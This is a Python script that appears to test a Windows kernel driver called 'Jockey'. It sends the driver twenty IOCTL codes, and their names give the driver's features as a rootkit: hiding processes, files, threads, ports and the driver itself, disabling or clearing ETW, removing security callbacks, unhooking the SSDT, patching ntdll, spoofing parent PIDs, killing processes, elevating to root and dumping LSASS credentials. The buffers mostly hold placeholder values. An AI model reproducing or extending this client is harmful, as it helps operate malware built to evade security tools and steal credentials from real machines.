import ctypes
from ctypes import wintypes

kernel32 = ctypes.WinDLL('kernel32', use_last_error=True)

CreateFile = kernel32.CreateFileW
CreateFile.argtypes = [wintypes.LPCWSTR, wintypes.DWORD, wintypes.DWORD,
                       wintypes.LPVOID, wintypes.DWORD, wintypes.DWORD, wintypes.HANDLE]
CreateFile.restype = wintypes.HANDLE

DeviceIoControl = kernel32.DeviceIoControl
DeviceIoControl.argtypes = [wintypes.HANDLE, wintypes.DWORD, wintypes.LPVOID, wintypes.DWORD,
                            wintypes.LPVOID, wintypes.DWORD,
                            ctypes.POINTER(wintypes.DWORD), wintypes.LPVOID]
DeviceIoControl.restype = wintypes.BOOL

CloseHandle = kernel32.CloseHandle
CloseHandle.argtypes = [wintypes.HANDLE]
CloseHandle.restype = wintypes.BOOL

IOCTLS = [
    (0x80002000, "PING",           4,    4),
    (0x80002004, "HIDE_PID",       8,    4),
    (0x80002008, "UNHIDE_PID",     8,    4),
    (0x8000200C, "HIDE_FILE",      264,  4),
    (0x80002010, "UNHIDE_FILE",    264,  4),
    (0x80002014, "GET_ROOT",       4,    4),
    (0x80002018, "KILL_PID",       8,    4),
    (0x8000201C, "DISABLE_ETW",    4,    4),
    (0x80002020, "DISABLE_OB_CB",  4,    4),
    (0x80002024, "HIDE_DRIVER",    4,    4),
    (0x80002028, "PROTECT_MEM",    24,   4),
    (0x8000202C, "DISABLE_CB",     4,    4),
    (0x80002030, "HIDE_THREAD",    8,    4),
    (0x80002034, "SPOOF_PPID",     8,    4),
    (0x80002038, "CLEAR_ETW",      4,    4),
    (0x8000203C, "DUMP_LSASS",     16,   4),
    (0x80002040, "HIDE_PORT",      8,    4),
    (0x80002044, "PROCESS_SHIELD", 12,   4),
    (0x80002048, "UNHOOK_SSDT",    4,    4),
    (0x8000204C, "PATCH_NTDLL",    4,    4),
]

def build_buf(code, in_len):
    buf = bytearray(in_len)
    if code == 0x80002000:  # PING
        buf[:4] = b'\x59\x4B\x4A\x00'
    elif code in (0x80002004, 0x80002008):  # HIDE/UNHIDE_PID
        buf[0] = 4  # PID 4 (System)
    elif code in (0x8000200C, 0x80002010):  # HIDE/UNHIDE_FILE
        buf[0:4] = b'\x59\x4B\x4A\x00'
        path = r"C:\Windows\System32\notepad.exe"
        buf[4:4+len(path)*2] = path.encode('utf-16-le') + b'\x00\x00'
    elif code == 0x80002014:  # GET_ROOT
        buf[:4] = b'\x59\x4B\x4A\x00'
    elif code == 0x80002018:  # KILL_PID
        buf[0:4] = b'\x59\x4B\x4A\x00'
        buf[4:8] = b'\x59\x59\x59\x59'  # fake high PID
    elif code == 0x8000201C:  # DISABLE_ETW
        buf[:4] = b'\x59\x4B\x4A\x00'
    elif code == 0x80002020:  # DISABLE_OB_CB
        buf[:4] = b'\x59\x4B\x4A\x00'
    elif code == 0x80002024:  # HIDE_DRIVER
        buf[:4] = b'\x59\x4B\x4A\x00'
    elif code == 0x80002028:  # PROTECT_MEM
        buf[0:4] = b'\x59\x4B\x4A\x00'
        buf[8:12] = b'\x00\x10\x00\x00'   # size
        buf[16:20] = b'\x00\x10\x00\x00'  # size2
    elif code == 0x8000202C:  # DISABLE_CALLBACKS
        buf[:4] = b'\x59\x4B\x4A\x00'
    elif code == 0x80002030:  # HIDE_THREAD
        buf[0:4] = b'\x04\x00\x00\x00'  # TID 4
    elif code == 0x80002034:  # SPOOF_PPID
        buf[0:4] = b'\x04\x00\x00\x00'
        buf[4:8] = b'\x04\x00\x00\x00'
    elif code == 0x80002038:  # CLEAR_ETW
        buf[:4] = b'\x59\x4B\x4A\x00'
    elif code == 0x8000203C:  # DUMP_LSASS
        buf[0:4] = b'\x04\x00\x00\x00'
        buf[8:12] = b'\x00\x01\x00\x00'
    elif code == 0x80002040:  # HIDE_PORT
        buf[0] = 0xD8
        buf[1] = 0x11
        buf[2] = 0x00
    elif code == 0x80002044:  # PROCESS_SHIELD
        buf[0:4] = b'\x04\x00\x00\x00'
        buf[8] = 0x72
    elif code in (0x80002048, 0x8000204C):  # UNHOOK/PATCH stubs
        buf[:4] = b'\x59\x4B\x4A\x00'
    return bytes(buf)

def main():
    h = CreateFile(r"\\.\Jockey", 0xC0000000, 0, None, 3, 0, None)
    if h == 0xFFFFFFFFFFFFFFFF:
        print(f"open fail: {ctypes.get_last_error()}")
        return 1

    print("=== JOCKEY FULL IOCTL TEST ===\n")
    ret = wintypes.DWORD(0)
    out_buf = ctypes.create_string_buffer(256)

    for code, name, in_len, _ in IOCTLS:
        buf = build_buf(code, in_len)
        ok = DeviceIoControl(h, code,
                             ctypes.c_char_p(buf), len(buf),
                             out_buf, 256,
                             ctypes.byref(ret), None)
        err = ctypes.get_last_error()
        status = "OK" if ok else "FAIL"
        print(f"  {name:<18} {status}  err={err}")

    CloseHandle(h)
    return 0

if __name__ == "__main__":
    raise SystemExit(main())
